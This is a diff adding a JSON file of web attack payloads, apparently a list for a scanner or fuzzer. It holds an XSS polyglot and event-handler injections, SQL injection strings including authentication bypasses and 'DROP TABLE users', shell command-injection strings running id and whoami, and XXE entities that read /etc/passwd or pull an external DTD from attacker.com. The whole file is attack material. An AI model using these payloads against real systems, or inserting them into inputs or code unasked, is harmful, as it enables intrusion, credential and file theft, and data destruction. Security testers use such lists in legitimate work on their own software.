@@ -1,0 +1,43 @@
+{
+    "xss": [
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//",
+        "'\"><img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>",
+        "javascript:alert(1)",
+        "<iframe src=javascript:alert(1)>",
+        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
+        "<body onload=alert(1)>",
+        "<marquee onstart=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "<select onfocus=alert(1) autofocus>"
+    ],
+    "sqli": [
+        "' OR '1'='1' -- ",
+        "' OR 1=1--",
+        "\" OR \"1\"=\"1\" -- ",
+        "' OR 'a'='a",
+        "') OR ('1'='1",
+        "admin'--",
+        "' UNION SELECT NULL--",
+        "1' AND '1'='1",
+        "' OR '1'='1' /*",
+        "'; DROP TABLE users--"
+    ],
+    "command": [
+        "; id #",
+        "| id #",
+        "& id #",
+        "`id`",
+        "$(id)",
+        ";ls -la;",
+        "|| whoami",
+        "& whoami &",
+        "`whoami`",
+        "$(whoami)"
+    ],
+    "xxe": [
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>"
+    ]
+}
